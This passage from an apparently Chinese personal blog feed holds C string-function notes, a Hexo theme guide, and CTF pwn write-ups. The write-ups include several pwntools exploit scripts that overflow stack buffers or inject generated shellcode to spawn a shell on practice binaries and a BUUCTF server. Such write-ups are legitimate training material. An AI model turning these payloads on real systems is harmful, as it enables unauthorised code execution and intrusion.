class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">strcmp</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *s1,<span class="keyword">const</span> <span class="keyword">char</span> *s2)</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(*s1==*s2&amp;&amp;*s1!=<span class="string">&#x27;\0&#x27;</span>)&#123;</span><br><span class="line">        s1++;s2++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> *s1-*s2;</span><br><span class="line">&#125; <span class="comment">//这个函数的简化思路可以单独写一个博客</span></span><br></pre></td></tr></table></figure><ul><li><p>strcmp 比较两个字符串数组的大小</p></li><li><p>相等返回0，前者大返回1，后者大返回-1</p></li><li><p>翁恺电脑有返回具体相差的值，而我的电脑没有。</p></li><li><p>用此函数作判断条件时要注意，相等返回的是0，不是1。</p><p>jh】</p></li></ul><h4 id="strcpy"><a href="#strcpy" class="headerlink" title="strcpy"></a>strcpy</h4><ul><li>将第二个参数字符串复制到第一个参数字符串，并且返回这个字符串</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">strcpy</span><span class="params">(<span class="keyword">char</span> *dst,<span class="keyword">const</span> <span class="keyword">char</span> * src)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> idx=<span class="number">0</span>; <span class="comment">//数组索引</span></span><br><span class="line"><span class="keyword">while</span>(src[idx])&#123;</span><br><span class="line">dst[idx]=src[idx];</span><br><span class="line">idx++;</span><br><span class="line">&#125;</span><br><span class="line">dst[idx]=<span class="string">&#x27;\0&#x27;</span>;<span class="comment">//循环结束0没有加上</span></span><br><span class="line"><span class="keyword">return</span> dst;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简化：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">mycpy</span><span class="params">(<span class="keyword">char</span> *dst,<span class="keyword">const</span> <span class="keyword">char</span> * src)</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span>* p=dst; <span class="comment">//用p指向dst数组</span></span><br><span class="line"><span class="keyword">while</span>(*dst++=*src++);<span class="comment">//先执行*dst=*src然后再执行*dst++;*src++;</span></span><br><span class="line">*dst=<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> p; <span class="comment">//因为dst地址++了，而p没有被++。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="strcat"><a href="#strcat" class="headerlink" title="strcat"></a>strcat</h4><p>安全版本    </p><h4 id="strchr和strrchr"><a href="#strchr和strrchr" class="headerlink" title="strchr和strrchr"></a>strchr和strrchr</h4><ul><li><p>找第   二个</p></li><li><p>输出搜索字符之前的字符串</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> s[]=<span class="string">&quot;hello&quot;</span>;</span><br><span class="line"><span class="keyword">char</span> *p=<span class="built_in">strchr</span>(s,<span class="string">&#x27;l&#x27;</span>);<span class="comment">//把s中&#x27;l&#x27;的地址赋给p</span></span><br><span class="line"><span class="keyword">int</span> c=*p;<span class="comment">//取出p指向的地址的值&#x27;l&#x27;赋给变量c</span></span><br><span class="line">*p=<span class="number">0</span>;<span class="comment">//让&#x27;l&#x27;变成&#x27;\0&#x27;</span></span><br><span class="line"><span class="keyword">char</span> *t=(<span class="keyword">char</span>*)<span class="built_in">malloc</span>(<span class="built_in">strlen</span>(s)+<span class="number">1</span>;</span><br><span class="line"><span class="comment">//创造s字符串内容+&#x27;\0&#x27;长度的内存地址并转化为char类型赋给t</span></span><br><span class="line"><span class="built_in">strcpy</span>(t,s);<span class="comment">//修改后的s赋给t（数组）（指针）</span></span><br><span class="line">*p=c; <span class="comment">//恢复原来s的原样            </span></span><br></pre></td></tr></table></figure><h4 id="strstr和strcasestr函数"><a href="#strstr和strcasestr函数" class="headerlink" title="strstr和strcasestr函数"></a>strstr和strcasestr函数</h4><p>1、strstr：在字符串中寻找字符串</p><p>2、strcasestr：在strstr基础上忽略大小写</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​                                                                                                                                        </summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>BUUCTF做题记录（一）</title>
    <link href="https://dh15219984801.store/2020/11/05/pwn/title%20BUUCTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>https://dh15219984801.store/2020/11/05/pwn/title%20BUUCTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</id>
    <published>2020-11-05T15:36:21.593Z</published>
    <updated>2020-11-13T14:45:15.001Z</updated>
    
    <content type="html"><![CDATA[<p>​                                                                     </p><h2 id="wustctf2020-getshell"><a href="#wustctf2020-getshell" class="headerlink" title="wustctf2020_getshell"></a>wustctf2020_getshell</h2><p>exps</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug_pause</span>():</span></span><br><span class="line">    log.info(proc.pidof(p))</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">proc_name = <span class="string">&#x27;./wustctf2020_getshell&#x27;</span></span><br><span class="line">p = process(proc_name)</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27332</span>)</span><br><span class="line">elf = ELF(proc_name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shell = elf.sym[<span class="string">&#x27;shell&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x18</span> + <span class="number">0x4</span>) + p32(shell)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/11/05/KwaTOD3yJfxRNkX.png" alt="image.png"></p><h2 id="picoctf-2018-buffer-overflow-1"><a href="#picoctf-2018-buffer-overflow-1" class="headerlink" title="picoctf_2018_buffer_overflow_1"></a>picoctf_2018_buffer_overflow_1</h2><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,arch=<span class="string">&quot;i386&quot;</span>)</span><br><span class="line"></span><br><span class="line">pwn = process(<span class="string">&quot;./buffer_overflow_1&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwn = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">25257</span> )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwn.recvuntil(<span class="string">&quot;Please enter your string: \n&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Addr = <span class="number">0x080485CB</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">0x28</span> + <span class="string">&#x27;A&#x27;</span>*<span class="number">0x4</span> + p32(Addr)</span><br><span class="line"></span><br><span class="line">pwn.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwn.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/11/05/8yc7Q4LstzUEre9.png" alt="image.png"></p><h2 id="bbys-tu-2016"><a href="#bbys-tu-2016" class="headerlink" title="bbys_tu_2016"></a>bbys_tu_2016</h2><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./bbys_tu_2016&quot;</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">25390</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0xc</span>+<span class="number">0x4</span>+<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line">payload += p32(<span class="number">0x0804856D</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/11/13/Ib35s98ALqBma2p.png" alt="image.png"></p><p>注：本题文flag的控制权限，因此不需要cat flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​                                                                     &lt;/p&gt;
&lt;h2 id=&quot;wustctf2020-getshell&quot;&gt;&lt;a href=&quot;#wustctf2020-getshell&quot; </summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>unbutu权限不够</title>
    <link href="https://dh15219984801.store/2020/10/20/Ubutun16.04/unbutu%E6%9D%83%E9%99%90%E4%B8%8D%E5%A4%9F/"/>
    <id>https://dh15219984801.store/2020/10/20/Ubutun16.04/unbutu%E6%9D%83%E9%99%90%E4%B8%8D%E5%A4%9F/</id>
    <published>2020-10-19T16:25:10.611Z</published>
    <updated>2020-11-06T02:26:23.031Z</updated>
    
    <content type="html"><![CDATA[<p>​                                                                       </p><p>原因：将window下的文件复制黏贴进unbutu，若直接拉则不会出现该情况</p><p>如下图：</p><p><img src="https://i.loli.net/2020/11/06/ILxqFnlGwXDgvB7.png" alt="image.png"></p><p>原因：#号提示是root用户的标志，而ubuntu默认的是普通用户，此时提示是$，并且并不能通过su切换用户命令进行切换，通常来说使用sudo即可完成对应的工作，但是如果在某些情况下希望使用带#的提示符，可以打开一个带超级用户权限的shell</p><p>百度了一下解决方法：</p><p>运行某个程序时，bash 说权限不足的问题</p><p>在Linux下，你自己编写的脚本需要执行的时候，需要加上执行权限：<br>chmod +x ./你的程序<br>或把所有权限都加上：<br>chmod +777 ./你的程序<br>再运行即可。</p><p>但出现  sudo: 无法解析主机：ubuntu: 连接超时的情况</p><p><img src="https://i.loli.net/2020/11/06/vZm3gVLXQEAMs5x.png" alt="image.png"></p><p>最后sudo -s切换root用户即可，而上面的chmod +x 表示加权限</p><p>终于打开文件，emmm</p><p><img src="https://i.loli.net/2020/11/06/GMYRNuZgjKbewVp.png" alt="image.png"></p><p>tip：sudo -s切换用户不需要联网，sudo 桌面版自带的不用安装</p><p>即该命令不需要联网，就windows切换用户一样。</p><blockquote><p>参考文献：<a href="https://blog.csdn.net/jobsss/article/details/7575009">https://blog.csdn.net/jobsss/article/details/7575009</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​                                                                       &lt;/p&gt;
&lt;p&gt;原因：将window下的文件复制黏贴进unbutu，若直接拉则不会出现该情况&lt;/p&gt;
&lt;p&gt;如下图：&lt;/p&gt;
&lt;p</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>shellcode get flag</title>
    <link href="https://dh15219984801.store/2020/10/18/pwn/title%20shellcord%20get%20flag/"/>
    <id>https://dh15219984801.store/2020/10/18/pwn/title%20shellcord%20get%20flag/</id>
    <published>2020-10-18T10:24:26.632Z</published>
    <updated>2020-11-17T15:21:10.065Z</updated>
    
    <content type="html"><![CDATA[<p>​                                                                </p><p>题目来源：<a href="http://ctf.mrskye.cn/challenges">http://ctf.mrskye.cn/challenges</a>                                          </p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>unbutu16.04终端运行shellcord，查看文件类型和保护机制</p><p>使用IDApro静态分析，查看相应的伪c代码（注意32位还是64位）</p><p>根据题目提示编写相应的python脚本</p><p>运行脚本夺旗</p><h5 id="1-终端运行程序，查看题目文件类型和保护机制"><a href="#1-终端运行程序，查看题目文件类型和保护机制" class="headerlink" title="1.终端运行程序，查看题目文件类型和保护机制"></a>1.终端运行程序，查看题目文件类型和保护机制</h5><p>提示输入你的shellcode，但是输入任意值出现段错误</p><p><img src="https://i.loli.net/2020/10/18/pJPDbt6MqVsT4Uj.png" alt="image.png"></p><p>段错误：程序运行时,变量访问越界一类的问题；可能出现的 原因有数组下标越界，或者访问了不能访问的内存，这里的问题应该为后者。</p><h6 id="checksec保护机制查看文件"><a href="#checksec保护机制查看文件" class="headerlink" title="checksec保护机制查看文件"></a>checksec保护机制查看文件</h6><p>操作系统提供了许多安全机制来尝试降低或阻止缓冲区溢出攻击带来的安全风险，包括DEP、ASLR等。在编写漏洞利用代码的时候，需要特别注意目标进程是否开启了DEP（Linux下对应NX）</p><p><img src="https://i.loli.net/2020/10/18/klAXevsawBTYyEm.png" alt="image.png"></p><p>可以看到NX保护关了，如果开启则我们的shellcode无法运行</p><h6 id="有关NX"><a href="#有关NX" class="headerlink" title="有关NX"></a>有关NX</h6><p>NX 即 No Execute，栈不可执行，也就是 Windows 上的 DEP。NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出，成功转入 shellcode 时，程序会尝试在数据页面上执行指令，此时 CPU 就会抛出异常，而不是去执行恶意指令。</p><p><a href="https://blog.csdn.net/weixin_43921239/article/details/99413569">checksec保护机制</a></p><h5 id="2-IDA反汇编分析"><a href="#2-IDA反汇编分析" class="headerlink" title="2.IDA反汇编分析"></a>2.IDA反汇编分析</h5><p>将shellcode直接拉进IDA，F5一键反汇编</p><p><img src="https://i.loli.net/2020/10/18/uiIJltVmTKOZ3a6.png" alt="image.png"></p><p>程序先输出“input your shellcode”（应该就是我们运行文件里面那一句）</p><p>然后调用read函数</p><p>这里是我们可以调用read函数向buf里面写入东西</p><p>最后一行 ((void (*)(void))buf)()就是调用了buf的函数</p><p>也就是我们把shellcode写进buf中，程序就会调用我们所写的shellcode</p><h5 id="3-编写脚本"><a href="#3-编写脚本" class="headerlink" title="3.编写脚本"></a>3.编写脚本</h5><p>要远程攻击服务器，要有相应的ip和端口，从靶机获取（可以先进行本地攻击）</p><p>编写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#导入pwntools</span></span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./shellcode&quot;</span>)</span><br><span class="line"><span class="comment">#载入程序</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = remote(&quot;ip地址&quot;,端口)</span></span><br><span class="line"><span class="comment">#链接远程服务器</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.i386.linux.sh())</span><br><span class="line"><span class="comment">#生成shellcode</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;shellcode\n&quot;</span>)</span><br><span class="line"><span class="comment">#接收程序显示出来的字符串，直至运行到read函数</span></span><br><span class="line"></span><br><span class="line">p.sendline(shellcode)</span><br><span class="line"><span class="comment">#向程序输入一行数据（shellcode）</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment">#将程序控制权交给用户，相当于自用运行</span></span><br></pre></td></tr></table></figure><h6 id="脚本总结："><a href="#脚本总结：" class="headerlink" title="脚本总结："></a>脚本总结：</h6><p>1.read函数可以为我们往buf写入数据，同时运行了buf，我们把shellcode写进buf，程序会帮我们调用shellcode</p><p>2.对recvuntil函数的使用</p><p>转载：<a href="https://blog.csdn.net/weixin_30484739/article/details/95845513">CTF常用python库PwnTools的使用学习</a></p><p>3用remote函数链接远端服务器</p><h5 id="4-运行脚本"><a href="#4-运行脚本" class="headerlink" title="4.运行脚本"></a>4.运行脚本</h5><p>在终端用python运行我们写好的脚本</p><p><img src="https://i.loli.net/2020/10/18/B6ZqDUrGEwVxLsg.png" alt="image.png"></p><p>获取了shell的权限后，用ls列出所有目录，再用cat flag来夺旗</p><p><img src="https://i.loli.net/2020/10/18/IezlhPaYxd8u3f6.png" alt="image.png"></p><p>最后把flag输入到靶机对应位置即可，注意要包括整行</p><p><img src="https://i.loli.net/2020/10/18/kFSWwhJ2DRUxizE.png" alt="image.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​                                                                &lt;/p&gt;
&lt;p&gt;题目来源：&lt;a href=&quot;http://ctf.mrskye.cn/challenges&quot;&gt;http://ctf.mrskye</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>博客主题搭建</title>
    <link href="https://dh15219984801.store/2020/10/17/blog/title%20%E5%8D%9A%E5%AE%A2%E4%B8%BB%E9%A2%98%E6%90%AD%E5%BB%BA/"/>
    <id>https://dh15219984801.store/2020/10/17/blog/title%20%E5%8D%9A%E5%AE%A2%E4%B8%BB%E9%A2%98%E6%90%AD%E5%BB%BA/</id>
    <published>2020-10-17T15:27:12.079Z</published>
    <updated>2020-10-18T05:03:53.876Z</updated>
    
    <content type="html"><![CDATA[<p>​                                                                       </p><h4 id="一-使用nexT主题"><a href="#一-使用nexT主题" class="headerlink" title="一.使用nexT主题"></a>一.<strong>使用nexT主题</strong></h4><h5 id="1-1下载nexT主题"><a href="#1-1下载nexT主题" class="headerlink" title="1.1下载nexT主题"></a><strong>1.1下载nexT主题</strong></h5><p>在Git Bash终端执行以下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https:&#x2F;&#x2F;github.com&#x2F;iissnan&#x2F;hexo-theme-next themes&#x2F;next1</span><br></pre></td></tr></table></figure><p>解压所下载的压缩包至站点的 themes 目录下， 并将解压后的文件夹名称更改为 next 。</p><h5 id="1-2启用nexT主题"><a href="#1-2启用nexT主题" class="headerlink" title="1.2启用nexT主题"></a><strong>1.2启用nexT主题</strong></h5><p>打开站点配置文件 _config.yml，找到 theme 字段，并将其值更改为 next。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">theme: next1</span><br></pre></td></tr></table></figure><p>在Git Bash终端执行命令hexo s，在浏览器中访问<a href="http://localhost:4000/%EF%BC%8C%E5%BD%93%E4%BD%A0%E7%9C%8B%E5%88%B0%E7%AB%99%E7%82%B9%E7%9A%84%E5%A4%96%E8%A7%82%E4%B8%8E%E4%B8%8B%E5%9B%BE%E6%89%80%E7%A4%BA%E7%B1%BB%E4%BC%BC%E6%97%B6%E5%8D%B3%E8%AF%B4%E6%98%8E%E4%BD%A0%E5%B7%B2%E6%88%90%E5%8A%9F%E5%AE%89%E8%A3%85">http://localhost:4000/，当你看到站点的外观与下图所示类似时即说明你已成功安装</a> NexT 主题。这是 NexT 默认的 Scheme —— Muse。</p><p><img src="https://i.loli.net/2020/10/17/FV7jYTiKBGuPJHA.png" alt="image.png"><br>本博客使用的是NexT.Pisces主题，修改主题配置文件 _config.yml的 Schemes 字段的值为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scheme: Pisces1</span><br></pre></td></tr></table></figure><p>博客预览如图：</p><p><img src="https://i.loli.net/2020/10/17/aOKSDqYuRht5VeW.png" alt="image.png"></p><h4 id="二-NexT主题配置"><a href="#二-NexT主题配置" class="headerlink" title="二.NexT主题配置"></a><strong>二.NexT主题配置</strong></h4><h5 id="2-1主题基本设定"><a href="#2-1主题基本设定" class="headerlink" title="2.1主题基本设定"></a><strong>2.1主题基本设定</strong></h5><p>参照<a href="http://theme-next.iissnan.com/getting-started.html#theme-settings">NexT使用文档</a>，设置界面语言、菜单、侧栏、头像、作者昵称和站点描述。由于该使用文档描述非常详细，本文不再赘述。此处需要注意，添加新的菜单项时，需要手动创建该页面才能正常访问，下面以分类页面为例讲述创建新页面的方法：</p><h5 id="2-2创建分类页面"><a href="#2-2创建分类页面" class="headerlink" title="2.2创建分类页面"></a><strong>2.2创建分类页面</strong></h5><p>在Git Bash终端执行命令:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new page categories1</span><br></pre></td></tr></table></figure><h5 id="2-3编辑分类页面"><a href="#2-3编辑分类页面" class="headerlink" title="2.3编辑分类页面"></a><strong>2.3编辑分类页面</strong></h5><p>添加页面类型字段，将其值设置为 “categories”，主题将自动为这个页面显示所有分类，如果有启用多说 或者 Disqus 评论，默认页面也会带有评论。需要关闭的话，请添加字段 comments 并将值设置为 false。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">title: 分类</span><br><span class="line">date: 2014-12-22 12:39:04</span><br><span class="line">type: &quot;categories&quot;</span><br><span class="line">comments: false1234</span><br></pre></td></tr></table></figure><p>创建标签页的方法同上，只需要将type字段设置为”tags”即可。</p><h5 id="2-4添加侧栏社交链接"><a href="#2-4添加侧栏社交链接" class="headerlink" title="2.4添加侧栏社交链接"></a><strong>2.4添加侧栏社交链接</strong></h5><p>在主题配置文件 _config.yml中Sidebar Settings部分添加字段：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># Social Links</span><br><span class="line">social:</span><br><span class="line">  GitHub: https:&#x2F;&#x2F;github.com&#x2F;wuxubj</span><br><span class="line">  Weibo: http:&#x2F;&#x2F;weibo.com&#x2F;wuxubj1234</span><br></pre></td></tr></table></figure><p>本博客将侧栏社交链接设置居中显示，修改themes\next\source\css_common\components\sidebar\sidebar-author-links.styl文件，添加如下样式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.links-of-author-item &#123;</span><br><span class="line">  text-align: center;</span><br><span class="line">  &#125;123</span><br></pre></td></tr></table></figure><h5 id="2-5添加侧栏友情链接"><a href="#2-5添加侧栏友情链接" class="headerlink" title="2.5添加侧栏友情链接"></a><strong>2.5添加侧栏友情链接</strong></h5><p>在主题配置文件 _config.yml中Sidebar Settings部分添加字段：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># Blogrolls</span><br><span class="line">links_title: 友情链接</span><br><span class="line">links_layout: inline</span><br><span class="line">links_icon: link  # 设置图标</span><br><span class="line">links:</span><br><span class="line">  鱼汐笔记: https:&#x2F;&#x2F;yidongying.github.io&#x2F;123456</span><br></pre></td></tr></table></figure><p>本博客侧栏友情链接使用了与侧栏社交链接相同的css样式，但文本左对齐。实现方法为：<br>修改themes\next\layout_macro\sidebar.swig，将如下内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;ul class&#x3D;&quot;links-of-blogroll-list&quot;&gt;</span><br><span class="line">  &#123;% for name, link in theme.links %&#125;</span><br><span class="line">    &lt;li class&#x3D;&quot;links-of-blogroll-item&quot;&gt;</span><br><span class="line">      &lt;a href&#x3D;&quot;&#123;&#123; link &#125;&#125;&quot; title&#x3D;&quot;&#123;&#123; name &#125;&#125;&quot; target&#x3D;&quot;_blank&quot;&gt;</span><br><span class="line">        &#123;&#123; name &#125;&#125;</span><br><span class="line">      &lt;&#x2F;a&gt;</span><br><span class="line">    &lt;&#x2F;li&gt;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&lt;&#x2F;ul&gt;123456789</span><br></pre></td></tr></table></figure><p>修改为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for name, link in theme.links %&#125;</span><br><span class="line">  &lt;span class&#x3D;&quot;links-of-author-item&quot; style&#x3D;&quot;text-align:left&quot;&gt;</span><br><span class="line">    &lt;a href&#x3D;&quot;&#123;&#123; link &#125;&#125;&quot; title&#x3D;&quot;&#123;&#123; name &#125;&#125;&quot; target&#x3D;&quot;_blank&quot;&gt;</span><br><span class="line">      &#123;&#123; name &#125;&#125;</span><br><span class="line">    &lt;&#x2F;a&gt;</span><br><span class="line">  &lt;&#x2F;span&gt;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><h4 id="三-NexT主题美化"><a href="#三-NexT主题美化" class="headerlink" title="三. NexT主题美化"></a><strong>三.</strong> <strong>NexT主题美化</strong></h4><h5 id="3-1修改导航栏图标"><a href="#3-1修改导航栏图标" class="headerlink" title="3.1修改导航栏图标"></a><strong>3.1修改导航栏图标</strong></h5><p>NexT 使用的是 <a href="https://fontawesome.com/?from=io">Font Awesome</a> 提供的图标， <a href="https://fontawesome.com/?from=io">Font Awesome</a> 提供了 600+ 的图标，可以满足绝大的多数的场景，同时无须担心在 Retina 屏幕下 图标模糊的问题。对应的文件在themes\next\source\vendors\font-awesome中。<br>在<a href="http://fontawesome.dashgame.com/%E4%B8%AD%E6%9C%89%E5%9B%BE%E6%A0%87%E4%B8%8E%E5%85%B6%E5%90%8D%E7%A7%B0%E7%9A%84%E5%AF%B9%E5%BA%94%EF%BC%8C%E7%94%A8%E6%88%B7%E5%8F%AF%E6%A0%B9%E6%8D%AE%E9%9C%80%E8%A6%81%E4%BF%AE%E6%94%B9%E5%9B%BE%E6%A0%87%E3%80%82%E6%88%91%E7%9A%84menu_icons%E9%85%8D%E7%BD%AE%E4%B8%BA%EF%BC%9A">http://fontawesome.dashgame.com/中有图标与其名称的对应，用户可根据需要修改图标。我的menu_icons配置为：</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">menu_icons:</span><br><span class="line">  enable: true</span><br><span class="line">  #KeyMapsToMenuItemKey: NameOfTheIconFromFontAwesome</span><br><span class="line">  home: home</span><br><span class="line">  about: user</span><br><span class="line">  categories: th</span><br><span class="line">  tags: tags</span><br><span class="line">  archives: 